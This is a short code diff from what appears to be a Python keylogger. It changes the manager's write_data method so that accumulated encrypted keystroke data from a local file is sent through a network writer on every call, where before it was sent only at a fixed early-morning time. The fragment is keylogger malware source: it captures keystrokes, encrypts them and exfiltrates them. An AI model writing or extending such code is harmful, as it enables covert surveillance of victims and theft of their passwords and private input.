@@ -1,13 +1,12 @@
-from logger.writer.IWriter import IWriter
 import sys
 sys.path.append('../../utilities/encryptionDecryption')
 from encryption import Encryption
+import uuid
 from logger.keylogger.keylogger_service import KeyloggerService
 from logger.writer.FileWriter import FileWriter
 from logger.writer.NetWorkWriter import NetWorkWriter
 from time import sleep
 from datetime import datetime
-import uuid
 import logging
 
 logging.basicConfig(filename='../../utilities/log.txt', level=logging.DEBUG, format='%(asctime)s - %(message)s', filemode='a')
@@ -53,7 +52,8 @@ class KeyLoggerManager:
             sleep(5)
 
     def write_data(self, encrypted_data):
-        if datetime.now().hour == 2 and datetime.now().minute == 20 and 0 <= datetime.now().second <= 5:
+        # if datetime.now().hour == 2 and datetime.now().minute == 20 and 0 <= datetime.now().second <= 5:
+        if True:
             self.writer = NetWorkWriter()
             with open('../Data_File.txt', 'r') as file:
                 encrypted_data = file.read() + encrypted_data
